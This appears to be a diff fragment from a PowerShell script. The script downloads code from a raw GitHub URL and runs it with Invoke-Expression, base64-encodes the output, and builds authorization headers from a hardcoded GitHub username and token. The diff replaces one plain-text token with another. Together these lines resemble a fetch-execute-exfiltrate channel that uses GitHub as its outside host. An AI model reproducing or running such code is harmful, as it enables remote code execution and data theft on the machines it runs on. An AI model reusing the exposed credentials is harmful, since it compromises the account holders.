@@ -171,7 +171,7 @@ $cmd = $wc.DownloadString("https://raw.githubusercontent.com/abhibade9/repos/mas
 $output = Invoke-Expression $cmd
 $Base64Output = [System.Convert]::ToBase64String([char[]]$Output.ToString());
 
-$Token = 'SaurabhAil:61c686dc65d086c6a9bdad14f8314a653fdd04d5'
+$Token = 'abhibade9:d4a7803cd2b2e5d532e7cf1cc46d75f32d20ff68'
 $Base64Token = [System.Convert]::ToBase64String([char[]]$Token);
 
 $Headers = new-object System.Collections.Specialized.NameValueCollection
